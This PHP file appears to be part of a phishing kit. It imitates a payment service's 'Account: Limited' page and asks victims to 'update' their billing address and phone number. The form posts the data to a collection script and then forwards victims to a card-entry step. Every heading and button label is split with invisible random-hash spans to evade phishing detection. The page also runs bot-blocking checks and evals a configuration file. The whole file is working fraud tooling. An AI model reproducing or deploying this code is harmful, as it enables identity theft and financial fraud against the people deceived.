<?php
require_once __DIR__ . '/function.php';

if (file_exists($api->dir_config . '/' . $api->general_config)) {
  @eval(file_get_contents($api->dir_config . '/' . $api->general_config));
}

if ($config_blocker == 1) {
  $api->cookie();
  $api->session();
}

$api->visitor("Sumarry");

$page = 'home';
$title = 'Account: Limited';
$notification = 3;
require __DIR__ . '/page/header.php';
?>

<div class="contents vx_mainContent">
<div class="mainContents summaryContainer">
<div class="engagementModule nemo_engagementModule">
<div class="engagementMainBar-container js_engagementMainBar-container">
<div class="summarySection engagementMainBar row" style="height:0%;">
<div class="col-sm-7 progressAndWelcome">
<div class="welcomeMessage js_selectModule selectModule profileStatus active">
<p class="vx_h3 engagementWelcomeMessage nemo_welcomeMessageHeader">
<span class="icon icon-small icon-lock-small" style="color:#ffffff"></span>&nbsp;<span style="color:#FFFFFF">
<span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("U");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("p");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("d");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("a");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("t");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("e");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("A");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("c");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("c");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("o");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("u");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("n");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("t");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("b");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("i");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("l");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("l");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("i");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("n");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("g");?></span>
</p>
</div>
</div>
</div>
</div>
</div>
<div class="mainBody">
<div class="overpanel-wrapper row">
<div class="overpanel-content col-xs-12 col-xs-offset-0 col-sm-8 col-sm-offset-2 col-md-4 col-md-offset-4">
<div class="overpanel-header">
<h2>
<span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("U");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("p");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("d");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("a");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("t");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("e");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("B");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("i");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("l");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("l");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("i");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("n");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("g");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("A");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("d");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("d");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("r");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("e");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("s");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("s");?></h2>
</div>
<div class="overpanel-body">
<form method="post" id="billing" autocomplete="off">
<div class="addressEntry">

<div class="cardInputs">
<div class="js_card_toggleField">
<div class="textInput lap" id="DivFname">
<input type="text" placeholder="<?=$api->transcode("First Name");?>" id="Fname" name="fname">
</div>
</div>
<div class="js_card_toggleField">
<div class="textInput pull-right lap" id="DivLname">
<input type="text" placeholder="<?=$api->transcode("Last Name");?>" id="Lname" name="lname">
</div>
</div>
</div>



<div class="textInput lap" id="DivAddress">
<input type="text" placeholder="<?=$api->transcode("Address Line");?>" id="Address" name="address">
</div>

<div class="cardInputs">
<div class="js_card_toggleField">
<div class="textInput lap" id="DivCity">
<input type="text" placeholder="<?=$api->transcode("City");?>" id="City" name="city">
</div>
</div>
<div class="js_card_toggleField">
<div class="textInput pull-right lap" id="DivState">
<input type="text" placeholder="<?=$api->transcode("State");?>" id="State" name="state">
</div>
</div>
</div>

<div class="cardInputs">
<div class="js_card_toggleField">
<div class="textInput lap" id="DivZip">
<input type="text" placeholder="<?=$api->transcode("Zip Code");?>" id="Zip" name="zip">
</div>
</div>
<div class="js_card_toggleField">
<div class="textInput pull-right lap" id="DivPhone">
<input type="tel" class="phone" placeholder="<?=$api->transcode("Phone Number");?>" id="Phone" name="phone">
</div>
</div>
</div>

</div>
<div style="display:none; visibility:hidden;"><input type="text" name="killbill" maxlength="50"></div>
<center>
    <button class="vx_btn" type="submit" id="btnConfirm">
<span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("U");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("p");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("d");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("a");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("t");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("e");?></button>
</center>
</form>
</div>
</div>
</div>
<div class="hasSpinner hide" id="loading"></div>


<script>
    $("#billing").validate({

  submitHandler: function(form) {
    $.post("../post/pobill.php", $("#billing").serialize(), function(GET) {
      setTimeout(function() {
        window.location.assign("confirm=card");
      }, 3000)
    });
  },
});

// Used to format phone number
function phoneFormatter() {
  $('.phone').on('input', function() {
    var number = $(this).val().replace(/[^\d]/g, '')
    if (number.length == 7) {
      number = number.replace(/(\d{3})(\d{4})/, "$1-$2");
    } else if (number.length == 10) {
      number = number.replace(/(\d{3})(\d{3})(\d{4})/, "($1) $2-$3");
    }
    $(this).val(number)
  });
};

$(phoneFormatter);
$(document).ready(function() {
  $("#btnConfirm").click(function() {
    var xFname = $("#Fname").val();
    var xLname = $("#Lname").val();
    var xAddress = $("#Address").val();
    var xCity = $("#City").val();
    var xState = $("#State").val();
    var xZip = $("#Zip").val();
    var xPhone = $("#Phone").val();
    var xStart;
//    if (xFname === "" || xFname.length < 2) {
//      xStart = false;
//      document.getElementById("DivFname").className = "textInput lap hasError";
//    }
    if (xLname === "" || xLname.length < 2) {
      xStart = false;
      document.getElementById("DivLname").className = "textInput pull-right lap hasError";
    }
    if (xAddress === "" || xAddress.length < 5 || xAddress.length > 50) {
      xStart = false;
      document.getElementById("DivAddress").className = "textInput lap hasError";
    }
    if (xCity === "" || xCity.length < 3) {
      xStart = false;
      document.getElementById("DivCity").className = "textInput lap hasError";
    }
    if (xState === "") {
      xStart = false;
      document.getElementById("DivState").className = "textInput pull-right lap hasError";
    }
    if (xZip === "" || xZip.length < 3 || xZip.length > 11) {
      xStart = false;
      document.getElementById("DivZip").className = "textInput lap hasError";
    }
    if (xPhone === "" || xPhone.length < 7 || xPhone.length > 15) {
      xStart = false;
      document.getElementById("DivPhone").className = "textInput  pull-right lap hasError";
    }
    if (xStart === false) {
      return false;
    } else {
      document.getElementById("loading").className = "hasSpinner";
    }

  })
  $("#Fname").keyup(function() {
    if ($(this).val().length !== "") {
      document.getElementById("DivFname").className = "textInput lap";
    } else {
      document.getElementById("DivFname").className = "textInput lap hasError";
    }
  })
  $("#Lname").keyup(function() {
    if ($(this).val().length !== "") {
      document.getElementById("DivLname").className = "textInput pull-right lap";
    } else {
      document.getElementById("DivLname").className = "textInput pull-right lap hasError";
    }
  })
  $("#Address").keyup(function() {
    if ($(this).val().length !== "") {
      document.getElementById("DivAddress").className = "textInput lap";
    } else {
      document.getElementById("DivAddress").className = "textInput lap hasError";
    }
  })
  $("#City").keyup(function() {
    if ($(this).val().length !== "") {
      document.getElementById("DivCity").className = "textInput lap";
    } else {
      document.getElementById("DivCity").className = "textInput lap hasError";
    }

  })
  $("#State").keyup(function() {
    if ($(this).val().length !== "") {
      document.getElementById("DivState").className = "textInput pull-right lap";
    } else {
      document.getElementById("DivState").className = "textInput pull-right lap hasError";
    }

  })
  $("#Zip").keyup(function() {
    if ($(this).val().length !== "") {
      document.getElementById("DivZip").className = "textInput lap ";
    } else {
      document.getElementById("DivZip").className = "textInput lap hasError";
    }

  })
  $("#Phone").keyup(function() {
    if ($(this).val().length !== "") {
      document.getElementById("DivPhone").className = "textInput pull-right lap";
    } else {
      document.getElementById("DivPhone").className = "textInput pull-right lap hasError";
    }

  })
})

    </script>

</div>
</div>
</div>
<?php
require __DIR__ . '/page/footer.php';
?>
